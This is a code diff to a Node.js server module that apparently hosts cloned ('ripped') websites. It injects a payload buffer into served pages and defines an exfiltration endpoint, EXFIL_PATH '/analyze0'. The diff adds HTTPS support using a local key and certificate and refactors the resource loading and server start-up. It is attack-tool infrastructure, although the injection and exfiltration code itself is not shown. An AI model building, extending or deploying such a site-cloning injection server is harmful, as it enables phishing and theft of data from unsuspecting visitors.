@@ -1,4 +1,5 @@
 import * as http from "http";
+import * as https from "https";
 import fs from 'fs/promises';
 import {performance} from 'perf_hooks';
 
@@ -16,19 +17,32 @@ const EXFIL_PATH = '/analyze0';
  * @param port the port to listen to.
  * @param resources the directory to serve.
  * @param inject payload buffer for injection.
+ * @param tls use https for the server.
  * @returns {Promise<void>}
  */
-export async function serve(host, port, resources, inject) {
+export async function serve(host, port, resources, inject, tls) {
+    resources = handle_resources_args(resources);
     inject_string = inject;
-
-    if (!resources.includes('/')) {
-        resources = `browser/ripped/${resources}`;
-    }
-    if (!resources.endsWith('/')) {
-        resources += '/';
-    }
+    Logger.info(`https is ${tls ? Ansi.green("enabled") : Ansi.red("disabled")}..`);
     Logger.info(`payload inject ${(inject) ? Ansi.green("enabled") : Ansi.red('disabled')}.`);
     Logger.info(`loading files from '${Ansi.cyan(resources)}' into ${Ansi.red('memory')}..`);
+    await load_files_into_memory(resources);
+    await start_server(host, port, tls);
+}
+
+async function start_server(host, port, tls) {
+    let callback = () => Logger.info(`${Ansi.green('server')} listening on ${Ansi.cyan(host)} port ${Ansi.cyan(port)}.`);
+    if (tls) {
+        https.createServer({
+            key: await fs.readFile('browser/keys/private-key.pem'),
+            cert: await fs.readFile('browser/keys/public-cert.pem')
+        },listener).listen(port, host, callback);
+    } else {
+        http.createServer(listener).listen(port, host, callback);
+    }
+}
+
+async function load_files_into_memory(resources) {
     // load dirtree into memory for performance and security.
     for await (let entry of walkdir(resources)) {
         let webpath = entry.path.replace(resources, '/');
@@ -45,8 +59,16 @@ export async function serve(host, port, resources, inject) {
         }
         Logger.info(`\t${Ansi.cyan(webpath.slice(-64))}`);
     }
-    http.createServer(listener).listen(port, host, () =>
-        Logger.info(`${Ansi.green('server')} listening on ${Ansi.cyan(host)} port ${Ansi.cyan(port)}.`));
+}
+
+function handle_resources_args(resources) {
+    if (!resources.includes('/')) {
+        resources = `browser/ripped/${resources}`;
+    }
+    if (!resources.endsWith('/')) {
+        resources += '/';
+    }
+    return resources;
 }
 
 function sniff(path) {
